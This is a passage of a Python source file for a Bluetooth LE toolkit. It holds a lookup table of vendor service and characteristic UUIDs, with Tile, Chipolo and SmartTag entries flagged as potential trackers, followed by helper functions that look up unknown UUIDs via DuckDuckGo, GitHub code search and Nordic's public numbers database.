        "name": "Fast Pair Additional Data",
        "description": "Additional data characteristic for Fast Pair",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c1239-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Model ID (Readable)",
        "description": "Readable model ID for Fast Pair devices",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c123a-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Data Characteristic",
        "description": "Fast Pair data exchange characteristic",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c123b-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Beacon Actions",
        "description": "Beacon actions characteristic for Fast Pair",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    # Google Nearby Share / Quick Share
    "0000fe2d-0000-1000-8000-00805f9b34fb": {
        "name": "Google Nearby Presence",
        "description": "Google Nearby Presence for device discovery",
        "spec": "Google Nearby",
        "url": "https://developers.google.com/nearby"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # SAMSUNG - Galaxy Buds, SmartThings, Wearables
    # ═══════════════════════════════════════════════════════════════════════════

    # Samsung Galaxy Buds
    "00001101-0000-1000-8000-00805f9b34fb": {
        "name": "Serial Port Profile (SPP)",
        "description": "Bluetooth Serial Port Profile (used by Galaxy Buds)",
        "spec": "Bluetooth SIG SPP",
        "url": None
    },
    "a3c87500-8ed3-4bdf-8a39-a01bebede295": {
        "name": "Samsung Galaxy Buds Service",
        "description": "Samsung Galaxy Buds proprietary control service",
        "spec": "Samsung Wearable SDK",
        "url": "https://github.com/ThePBone/GalaxyBudsClient"
    },
    "a3c87501-8ed3-4bdf-8a39-a01bebede295": {
        "name": "Galaxy Buds Data",
        "description": "Galaxy Buds data exchange characteristic",
        "spec": "Samsung Wearable SDK",
        "url": "https://github.com/ThePBone/GalaxyBudsClient"
    },
    "a3c87502-8ed3-4bdf-8a39-a01bebede295": {
        "name": "Galaxy Buds Control",
        "description": "Galaxy Buds control commands",
        "spec": "Samsung Wearable SDK",
        "url": "https://github.com/ThePBone/GalaxyBudsClient"
    },
    # Samsung SmartThings
    "0000fe31-0000-1000-8000-00805f9b34fb": {
        "name": "Samsung SmartThings Service",
        "description": "Samsung SmartThings IoT service",
        "spec": "Samsung SmartThings",
        "url": "https://developer.smartthings.com/"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # BOSE - QuietComfort, SoundLink, Headphones
    # ═══════════════════════════════════════════════════════════════════════════

    "febe": {
        "name": "Bose Service",
        "description": "Bose proprietary service UUID",
        "spec": "Bose Connect SDK",
        "url": None
    },
    "0000febe-0000-1000-8000-00805f9b34fb": {
        "name": "Bose Service (Full)",
        "description": "Bose proprietary service for headphones control",
        "spec": "Bose Connect SDK",
        "url": None
    },
    "d49ab8f8-b09f-4d42-9abc-7aa9f7b9b1e0": {
        "name": "Bose QuietComfort Service",
        "description": "Bose QuietComfort ANC and control service",
        "spec": "Bose Connect SDK (proprietary)",
        "url": "https://github.com/AsteroidOS/bose-qc35-reverse-engineering"
    },
    "f5aa5a71-593f-4a19-8f58-0e54f3f8e501": {
        "name": "Bose Control Characteristic",
        "description": "Bose headphone control characteristic",
        "spec": "Bose Connect SDK (proprietary)",
        "url": None
    },
    "69c67fa6-93d5-4c8d-855b-3f8e8d7f7c59": {
        "name": "Bose Status Notify",
        "description": "Bose status notification characteristic",
        "spec": "Bose Connect SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # SONY - WH-1000XM Series, WF Earbuds, Walkman
    # ═══════════════════════════════════════════════════════════════════════════

    # Sony Audio Services (5b833eXX base pattern)
    "5b833e06-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Audio Control Service",
        "description": "Sony proprietary audio control (write commands, receive notifications)",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833e26-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Audio Status Service",
        "description": "Sony proprietary audio status (ANC, EQ, codec settings)",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833e27-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Device Info Service",
        "description": "Sony proprietary device information service",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    # Sony Audio Characteristics (5b833cXX base pattern)
    "5b833c10-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Command Write",
        "description": "Write commands to control headphones (ANC, EQ, etc.)",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833c11-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Status Write",
        "description": "Write status/configuration changes",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833c12-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Command Notify",
        "description": "Receive notifications for command responses",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833c13-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Status Notify",
        "description": "Receive status change notifications",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833c1b-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Extended Notify 1",
        "description": "Extended notification channel (battery, etc.)",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833c1c-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Extended Write",
        "description": "Extended write channel for advanced settings",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "5b833c68-6bc7-4802-8e9a-723ceca4bd8f": {
        "name": "Sony Device ID",
        "description": "Device identifier/serial number readable characteristic",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    # Sony Extended Audio (f76acbXX base pattern - newer firmware)
    "f76acb00-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Audio Service",
        "description": "Sony extended audio service (newer WH-1000XM series)",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "f76acb01-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Command Write",
        "description": "Extended command write characteristic",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb02-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Notify 1",
        "description": "Extended notification characteristic 1",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb03-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Notify 2",
        "description": "Extended notification characteristic 2",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb04-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Command Write 2",
        "description": "Secondary command write characteristic",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb05-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Notify 3",
        "description": "Extended notification characteristic 3",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb06-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Notify 4",
        "description": "Extended notification characteristic 4",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb07-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Command Write 3",
        "description": "Tertiary command write characteristic",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb08-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Notify 5",
        "description": "Extended notification characteristic 5",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },
    "f76acb09-7cab-495f-bb1a-e664598fd77f": {
        "name": "Sony Extended Notify 6",
        "description": "Extended notification characteristic 6",
        "spec": "Sony Headphones SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # JABRA - Elite Series, Evolve, Talk
    # ═══════════════════════════════════════════════════════════════════════════

    "82dd9600-a6e2-4f57-8437-c0af6b8c5ef8": {
        "name": "Jabra Service",
        "description": "Jabra proprietary control service",
        "spec": "Jabra SDK (proprietary)",
        "url": None
    },
    "82dd9601-a6e2-4f57-8437-c0af6b8c5ef8": {
        "name": "Jabra Command",
        "description": "Jabra command write characteristic",
        "spec": "Jabra SDK (proprietary)",
        "url": None
    },
    "82dd9602-a6e2-4f57-8437-c0af6b8c5ef8": {
        "name": "Jabra Response",
        "description": "Jabra response notification characteristic",
        "spec": "Jabra SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # SENNHEISER - Momentum, HD Series, Gaming
    # ═══════════════════════════════════════════════════════════════════════════

    "8d0a0000-8b36-4e47-8c20-59b96a1e2f28": {
        "name": "Sennheiser Service",
        "description": "Sennheiser proprietary audio service",
        "spec": "Sennheiser Smart Control (proprietary)",
        "url": None
    },
    "8d0a0001-8b36-4e47-8c20-59b96a1e2f28": {
        "name": "Sennheiser Control",
        "description": "Sennheiser control characteristic",
        "spec": "Sennheiser Smart Control (proprietary)",
        "url": None
    },
    "8d0a0002-8b36-4e47-8c20-59b96a1e2f28": {
        "name": "Sennheiser Status",
        "description": "Sennheiser status notification characteristic",
        "spec": "Sennheiser Smart Control (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # JBL / HARMAN - Tune, Live, Club Series
    # ═══════════════════════════════════════════════════════════════════════════

    "65786365-6c70-6f69-6e74-000000000000": {
        "name": "Harman/JBL Service",
        "description": "Harman/JBL proprietary audio service",
        "spec": "JBL Headphones SDK (proprietary)",
        "url": None
    },
    "65786365-6c70-6f69-6e74-000000000001": {
        "name": "JBL Control Write",
        "description": "JBL control write characteristic",
        "spec": "JBL Headphones SDK (proprietary)",
        "url": None
    },
    "65786365-6c70-6f69-6e74-000000000002": {
        "name": "JBL Status Notify",
        "description": "JBL status notification characteristic",
        "spec": "JBL Headphones SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # BEATS (APPLE) - Studio, Solo, Fit, Powerbeats
    # ═══════════════════════════════════════════════════════════════════════════

    "9d8a5c00-81c3-4e49-a0b7-d97a59b81f10": {
        "name": "Beats Service",
        "description": "Beats by Dre proprietary service (Apple subsidiary)",
        "spec": "Beats SDK (proprietary, Apple)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # QUALCOMM - QCC Chipsets, aptX, TrueWireless
    # ═══════════════════════════════════════════════════════════════════════════

    "00001100-d102-11e1-9b23-00025b00a5a5": {
        "name": "Qualcomm aptX Service",
        "description": "Qualcomm aptX codec service",
        "spec": "Qualcomm aptX",
        "url": "https://www.qualcomm.com/products/features/aptx"
    },
    "00001101-d102-11e1-9b23-00025b00a5a5": {
        "name": "Qualcomm TWS Service",
        "description": "Qualcomm TrueWireless Stereo service",
        "spec": "Qualcomm TWS+",
        "url": None
    },
    "0000eb03-d102-11e1-9b23-00025b00a5a5": {
        "name": "Qualcomm GAIA Service",
        "description": "Qualcomm GAIA protocol for device management",
        "spec": "Qualcomm GAIA",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # NORDIC SEMICONDUCTOR - nRF Chipsets, DFU
    # ═══════════════════════════════════════════════════════════════════════════

    "00001530-1212-efde-1523-785feabcd123": {
        "name": "Nordic DFU Service",
        "description": "Nordic Semiconductor DFU (Device Firmware Update) service",
        "spec": "Nordic DFU Protocol",
        "url": "https://infocenter.nordicsemi.com/topic/sdk_nrf5_v17.1.0/lib_dfu_transport_ble.html"
    },
    "00001531-1212-efde-1523-785feabcd123": {
        "name": "Nordic DFU Control Point",
        "description": "DFU control point for firmware update commands",
        "spec": "Nordic DFU Protocol",
        "url": None
    },
    "00001532-1212-efde-1523-785feabcd123": {
        "name": "Nordic DFU Packet",
        "description": "DFU packet characteristic for firmware data",
        "spec": "Nordic DFU Protocol",
        "url": None
    },
    "00001534-1212-efde-1523-785feabcd123": {
        "name": "Nordic DFU Version",
        "description": "DFU version characteristic",
        "spec": "Nordic DFU Protocol",
        "url": None
    },
    # Nordic UART Service (NUS)
    "6e400001-b5a3-f393-e0a9-e50e24dcca9e": {
        "name": "Nordic UART Service",
        "description": "Nordic UART Service for serial communication over BLE",
        "spec": "Nordic UART Service",
        "url": "https://developer.nordicsemi.com/nRF_Connect_SDK/doc/latest/nrf/libraries/bluetooth_services/services/nus.html"
    },
    "6e400002-b5a3-f393-e0a9-e50e24dcca9e": {
        "name": "Nordic UART RX",
        "description": "UART RX characteristic (write to device)",
        "spec": "Nordic UART Service",
        "url": None
    },
    "6e400003-b5a3-f393-e0a9-e50e24dcca9e": {
        "name": "Nordic UART TX",
        "description": "UART TX characteristic (notify from device)",
        "spec": "Nordic UART Service",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # TEXAS INSTRUMENTS - CC26xx, SensorTag
    # ═══════════════════════════════════════════════════════════════════════════

    "f000aa00-0451-4000-b000-000000000000": {
        "name": "TI SensorTag IR Temperature",
        "description": "TI SensorTag IR temperature service",
        "spec": "TI SensorTag",
        "url": "https://www.ti.com/tool/CC2650STK"
    },
    "f000aa20-0451-4000-b000-000000000000": {
        "name": "TI SensorTag Humidity",
        "description": "TI SensorTag humidity service",
        "spec": "TI SensorTag",
        "url": None
    },
    "f000aa40-0451-4000-b000-000000000000": {
        "name": "TI SensorTag Barometer",
        "description": "TI SensorTag barometric pressure service",
        "spec": "TI SensorTag",
        "url": None
    },
    "f000aa80-0451-4000-b000-000000000000": {
        "name": "TI SensorTag Movement",
        "description": "TI SensorTag motion/accelerometer service",
        "spec": "TI SensorTag",
        "url": None
    },
    "f000ffc0-0451-4000-b000-000000000000": {
        "name": "TI OAD Service",
        "description": "TI Over-the-Air Download (firmware update) service",
        "spec": "TI OAD Protocol",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # XIAOMI / MI - Mi Band, Buds, Smart Home
    # ═══════════════════════════════════════════════════════════════════════════

    "0000fee0-0000-1000-8000-00805f9b34fb": {
        "name": "Xiaomi Mi Band Service",
        "description": "Xiaomi Mi Band fitness tracker service",
        "spec": "Xiaomi Wearable SDK",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "0000fee1-0000-1000-8000-00805f9b34fb": {
        "name": "Xiaomi Authentication Service",
        "description": "Xiaomi device authentication service",
        "spec": "Xiaomi Wearable SDK",
        "url": "https://github.com/Freeyourgadget/Gadgetbridge"
    },
    "00000009-0000-3512-2118-0009af100700": {
        "name": "Xiaomi Buds Service",
        "description": "Xiaomi earbuds control service",
        "spec": "Xiaomi Audio SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # HUAWEI - FreeBuds, Watch, Band
    # ═══════════════════════════════════════════════════════════════════════════

    "0000fe86-0000-1000-8000-00805f9b34fb": {
        "name": "Huawei Service",
        "description": "Huawei proprietary service",
        "spec": "Huawei Wearable SDK",
        "url": None
    },
    "fe86": {
        "name": "Huawei Service (Short)",
        "description": "Huawei proprietary service (16-bit)",
        "spec": "Huawei Wearable SDK",
        "url": None
    },
    "00002a50-0000-1000-8000-00805f9b34fb": {
        "name": "Huawei PnP ID (Extended)",
        "description": "Huawei extended PnP ID characteristic",
        "spec": "Huawei Wearable SDK",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # FITBIT (GOOGLE) - Fitness Trackers, Smartwatches
    # ═══════════════════════════════════════════════════════════════════════════

    "adabfb00-6e7d-4601-bda2-bffaa68956ba": {
        "name": "Fitbit Service",
        "description": "Fitbit proprietary communication service",
        "spec": "Fitbit SDK (proprietary, Google)",
        "url": None
    },
    "adabfb01-6e7d-4601-bda2-bffaa68956ba": {
        "name": "Fitbit Write",
        "description": "Fitbit data write characteristic",
        "spec": "Fitbit SDK (proprietary)",
        "url": None
    },
    "adabfb02-6e7d-4601-bda2-bffaa68956ba": {
        "name": "Fitbit Notify",
        "description": "Fitbit notification characteristic",
        "spec": "Fitbit SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # GARMIN - Fitness, GPS, Smartwatches
    # ═══════════════════════════════════════════════════════════════════════════

    "6a4e2401-667b-11e3-949a-0800200c9a66": {
        "name": "Garmin Service",
        "description": "Garmin Connect IQ service",
        "spec": "Garmin Connect IQ SDK",
        "url": "https://developer.garmin.com/connect-iq/"
    },
    "6a4e2800-667b-11e3-949a-0800200c9a66": {
        "name": "Garmin GFDI Service",
        "description": "Garmin GFDI (File Download Interface) service",
        "spec": "Garmin GFDI Protocol",
        "url": None
    },
    "6a4e2500-667b-11e3-949a-0800200c9a66": {
        "name": "Garmin FIT Service",
        "description": "Garmin FIT file transfer service",
        "spec": "Garmin FIT SDK",
        "url": "https://developer.garmin.com/fit/protocol/"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # TILE / LIFE360 - Trackers
    # ═══════════════════════════════════════════════════════════════════════════

    "feed": {
        "name": "⚠️ Tile Tracker Service",
        "description": "Tile tracker service - POTENTIAL TRACKING DEVICE",
        "spec": "Tile Protocol",
        "url": None,
        "tracker": True
    },
    "feec": {
        "name": "⚠️ Tile Tracker Service (Alt)",
        "description": "Tile tracker service (alternate UUID) - POTENTIAL TRACKING DEVICE",
        "spec": "Tile Protocol",
        "url": None,
        "tracker": True
    },
    "fd84": {
        "name": "⚠️ Tile Tracker Service (New)",
        "description": "Tile tracker service (new format) - POTENTIAL TRACKING DEVICE",
        "spec": "Tile Protocol",
        "url": None,
        "tracker": True
    },
    "0000feed-0000-1000-8000-00805f9b34fb": {
        "name": "⚠️ Tile Service",
        "description": "Tile tracker communication service - POTENTIAL TRACKING DEVICE",
        "spec": "Tile Protocol",
        "url": None,
        "tracker": True
    },
    "9d410018-35d6-f4dd-ba60-e7bd8dc491c0": {
        "name": "Tile TOA Service",
        "description": "Tile TOA (Time of Arrival) ranging service",
        "spec": "Tile Protocol",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # CHIPOLO - Trackers
    # ═══════════════════════════════════════════════════════════════════════════

    "fe33": {
        "name": "⚠️ Chipolo Tracker Service",
        "description": "Chipolo tracker service - POTENTIAL TRACKING DEVICE",
        "spec": "Chipolo Protocol",
        "url": None,
        "tracker": True
    },
    "fe65": {
        "name": "⚠️ Chipolo Tracker Service (Alt)",
        "description": "Chipolo tracker service (alternate) - POTENTIAL TRACKING DEVICE",
        "spec": "Chipolo Protocol",
        "url": None,
        "tracker": True
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # SAMSUNG SMARTTAG - Trackers
    # ═══════════════════════════════════════════════════════════════════════════

    "fd5a": {
        "name": "⚠️ Samsung SmartTag Service",
        "description": "Samsung SmartTag/SmartThings tracker - POTENTIAL TRACKING DEVICE",
        "spec": "Samsung SmartThings Protocol",
        "url": None,
        "tracker": True
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # COVID-19 EXPOSURE NOTIFICATION
    # ═══════════════════════════════════════════════════════════════════════════

    "fd6f": {
        "name": "COVID-19 Exposure Notification",
        "description": "Apple/Google COVID-19 contact tracing service",
        "spec": "Exposure Notification Bluetooth Specification",
        "url": "https://covid19.apple.com/contacttracing"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # SKULLCANDY - Headphones, Earbuds
    # ═══════════════════════════════════════════════════════════════════════════

    "65786365-6c70-6f69-6e74-2e636f6d0001": {
        "name": "Skullcandy Service",
        "description": "Skullcandy proprietary control service",
        "spec": "Skullcandy App SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # ANKER / SOUNDCORE - Earbuds, Speakers
    # ═══════════════════════════════════════════════════════════════════════════

    "0cf4": {
        "name": "Anker/Soundcore Service (Short)",
        "description": "Anker/Soundcore proprietary service",
        "spec": "Soundcore App SDK (proprietary)",
        "url": None
    },
    "cba20d00-224d-11e6-9fb8-0002a5d5c51b": {
        "name": "Anker Switchbot Service",
        "description": "Anker/Switchbot IoT device service",
        "spec": "Switchbot API",
        "url": "https://github.com/OpenWonderLabs/SwitchBotAPI-BLE"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # BANG & OLUFSEN - Premium Audio
    # ═══════════════════════════════════════════════════════════════════════════

    "0000180f-0000-1000-8000-00805f9b34fb": {
        "name": "Battery Service",
        "description": "Standard Battery Service (used by B&O)",
        "spec": "Bluetooth SIG",
        "url": "https://www.bluetooth.com/specifications/specs/battery-service-1-0/"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # AUDIO-TECHNICA - Headphones
    # ═══════════════════════════════════════════════════════════════════════════

    "0efc95c0-b0f5-11e3-8a8b-f4a7dcf0e8a5": {
        "name": "Audio-Technica Service",
        "description": "Audio-Technica proprietary control service",
        "spec": "Audio-Technica Connect App (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # PLANTRONICS / POLY - Headsets
    # ═══════════════════════════════════════════════════════════════════════════

    "82d0e001-bab8-4037-b9be-6680cd001ab4": {
        "name": "Plantronics/Poly Service",
        "description": "Plantronics/Poly headset control service",
        "spec": "Plantronics Hub SDK (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # REALTEK - BT Chipsets (RTL87xx)
    # ═══════════════════════════════════════════════════════════════════════════

    "0000ffc0-0000-1000-8000-00805f9b34fb": {
        "name": "Realtek OTA Service",
        "description": "Realtek RTL87xx OTA update service",
        "spec": "Realtek BT SDK",
        "url": None
    },
    "d0611e78-bbb4-4591-a5f8-487910ae4367": {
        "name": "Realtek Vendor Service",
        "description": "Realtek proprietary vendor service",
        "spec": "Realtek BT SDK",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # ESPRESSIF - ESP32 BLE
    # ═══════════════════════════════════════════════════════════════════════════

    "000000ff-0000-1000-8000-00805f9b34fb": {
        "name": "ESP32 Provisioning Service",
        "description": "ESP32 WiFi provisioning over BLE",
        "spec": "ESP-IDF Provisioning",
        "url": "https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/provisioning/wifi_provisioning.html"
    },
    "021a9004-0382-4aea-bff4-6b3f1c5adfb4": {
        "name": "ESP32 BluFi Service",
        "description": "ESP32 BluFi WiFi configuration service",
        "spec": "ESP-IDF BluFi",
        "url": "https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/bluetooth/esp_blufi.html"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # COMMON VENDOR PATTERNS
    # ═══════════════════════════════════════════════════════════════════════════

    # Audio Codec Control (common pattern)
    "45c93e07-d90d-4b93-a9db-91e5dd734e35": {
        "name": "Audio Codec Control Service",
        "description": "Audio codec configuration service (LDAC, AAC, SBC selection)",
        "spec": "Vendor Audio SDK",
        "url": None
    },
    "45c93c15-d90d-4b93-a9db-91e5dd734e35": {
        "name": "Codec Control Write",
        "description": "Write codec settings and preferences",
        "spec": "Vendor Audio SDK",
        "url": None
    },
    "45c93c16-d90d-4b93-a9db-91e5dd734e35": {
        "name": "Codec Status Notify",
        "description": "Codec status change notifications",
        "spec": "Vendor Audio SDK",
        "url": None
    },
    "45c93c17-d90d-4b93-a9db-91e5dd734e35": {
        "name": "Codec Info Notify",
        "description": "Current codec information notifications",
        "spec": "Vendor Audio SDK",
        "url": None
    },
    # OTA Update (common pattern)
    "76c13020-fe8f-416a-b4c3-ee59d3ef95dc": {
        "name": "OTA Update Service",
        "description": "Over-the-air firmware update service",
        "spec": "Vendor OTA Protocol",
        "url": None
    },
    "76c13021-fe8f-416a-b4c3-ee59d3ef95dc": {
        "name": "OTA Control Write",
        "description": "Write OTA update commands",
        "spec": "Vendor OTA Protocol",
        "url": None
    },
    "76c13022-fe8f-416a-b4c3-ee59d3ef95dc": {
        "name": "OTA Status Read",
        "description": "Read OTA update status",
        "spec": "Vendor OTA Protocol",
        "url": None
    },
    # Spatial Audio (common pattern)
    "dc405470-a351-4a59-97d8-2e2e3b207fbb": {
        "name": "Spatial Audio Service",
        "description": "Spatial/3D audio and head tracking service",
        "spec": "Vendor Spatial Audio SDK",
        "url": None
    },
    "bfd869fa-a3f2-4c2f-bcff-3eb1ec80cead": {
        "name": "Spatial Audio Write",
        "description": "Write spatial audio settings (head tracking, etc.)",
        "spec": "Vendor Spatial Audio SDK",
        "url": None
    },
    "2a6b6575-faf6-418c-923f-ccd63a56d955": {
        "name": "Spatial Audio Notify",
        "description": "Spatial audio state notifications",
        "spec": "Vendor Spatial Audio SDK",
        "url": None
    },
    # LE Audio Control
    "11c8b310-80e4-4276-afc0-f81590b2177f": {
        "name": "LE Audio Control Service",
        "description": "Bluetooth LE Audio control service",
        "spec": "Bluetooth LE Audio",
        "url": "https://www.bluetooth.com/specifications/le-audio/"
    },
    # Generic vendor extensions
    "28bc862f-87d2-457b-b45a-5c838c4a66ff": {
        "name": "Vendor Extended Control",
        "description": "Vendor-specific extended control service",
        "spec": "Vendor SDK",
        "url": None
    },
    "d614da49-46db-4edb-8cea-62d6435f3156": {
        "name": "Vendor Extended Control Char",
        "description": "Vendor-specific extended control characteristic",
        "spec": "Vendor SDK",
        "url": None
    },
}


async def search_web_for_uuid(uuid: str) -> dict:
    """Search the web for information about a UUID using DuckDuckGo.

    Args:
        uuid: The UUID to search for

    Returns:
        Dictionary with search result or None
    """
    import urllib.request
    import urllib.parse
    import re

    uuid_lower = uuid.lower()

    # First check our known specifications database
    if uuid_lower in KNOWN_BLE_SPECIFICATIONS:
        spec = KNOWN_BLE_SPECIFICATIONS[uuid_lower]
        return {
            "name": spec["name"],
            "description": spec["description"],
            "spec": spec["spec"],
            "url": spec.get("url"),
            "source": "Known BLE Specifications"
        }

    # Try DuckDuckGo HTML search (no API key needed)
    try:
        # Search for the UUID in quotes
        query = urllib.parse.quote(f'"{uuid}"')
        url = f"https://html.duckduckgo.com/html/?q={query}"
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        })
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode('utf-8', errors='ignore')

            # Extract result snippets
            # DuckDuckGo HTML results are in <a class="result__a"> tags
            results = []

            # Find result titles and URLs
            title_pattern = r'<a[^>]*class="result__a"[^>]*href="([^"]*)"[^>]*>([^<]*)</a>'
            snippet_pattern = r'<a[^>]*class="result__snippet"[^>]*>([^<]*)</a>'

            titles = re.findall(title_pattern, html, re.IGNORECASE)
            snippets = re.findall(snippet_pattern, html, re.IGNORECASE)

            for i, (result_url, title) in enumerate(titles[:3]):
                # Decode DuckDuckGo redirect URL
                if 'uddg=' in result_url:
                    actual_url = urllib.parse.unquote(
                        result_url.split('uddg=')[-1].split('&')[0])
                else:
                    actual_url = result_url

                snippet = snippets[i] if i < len(snippets) else ""

                # Clean up HTML entities
                title = title.replace('&amp;', '&').replace(
                    '&lt;', '<').replace('&gt;', '>')
                snippet = snippet.replace('&amp;', '&').replace(
                    '&lt;', '<').replace('&gt;', '>')

                # Skip if it's just a UUID listing without context
                if title and uuid.lower() not in title.lower():
                    results.append({
                        "title": title.strip(),
                        "url": actual_url,
                        "snippet": snippet.strip()[:200] if snippet else None
                    })

            if results:
                return {
                    "web_results": results,
                    "source": "DuckDuckGo Search"
                }
    except Exception:
        pass

    return {}


async def search_uuid_github(uuid: str) -> list:
    """Search GitHub for information about a UUID.

    Args:
        uuid: The 128-bit UUID to search for

    Returns:
        List of dictionaries with search results
    """
    import urllib.request
    import urllib.error
    import urllib.parse
    import json

    results = []

    # Search GitHub code (note: requires no auth for basic search)
    try:
        # URL-encode the UUID
        encoded_uuid = urllib.parse.quote(f'"{uuid}"')
        url = f"https://api.github.com/search/code?q={encoded_uuid}&per_page=5"
        req = urllib.request.Request(url, headers={
            "User-Agent": "RACE-Toolkit/1.0",
            "Accept": "application/vnd.github.v3+json"
        })
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode('utf-8'))
            if data.get("total_count", 0) > 0:
                for item in data.get("items", [])[:3]:
                    results.append({
                        "repo": item.get("repository", {}).get("full_name"),
                        "path": item.get("path"),
                        "url": item.get("html_url"),
                        "source": "GitHub"
                    })
    except Exception:
        pass

    return results


async def search_nordic_database(uuid: str) -> dict:
    """Search the Nordic Semiconductor Bluetooth Numbers Database.

    Args:
        uuid: The UUID to search for (short or long format)

    Returns:
        Dictionary with characteristic info if found
    """
    import urllib.request
    import json

    # Nordic maintains a public JSON database
    try:
        # Try the characteristics database
        url = "https://raw.githubusercontent.com/NordicSemiconductor/bluetooth-numbers-database/master/v1/characteristic_uuids.json"
        req = urllib.request.Request(
            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode('utf-8'))
            uuid_lower = uuid.lower()
            for entry in data:
                if entry.get("uuid", "").lower() == uuid_lower:
                    return {
                        "name": entry.get("name"),
                        "identifier": entry.get("identifier"),
                        "source": "Nordic Bluetooth Numbers Database"
                    }
    except Exception:
        pass

    return {}


async def analyze_uuid_patterns(uuids: list) -> dict:
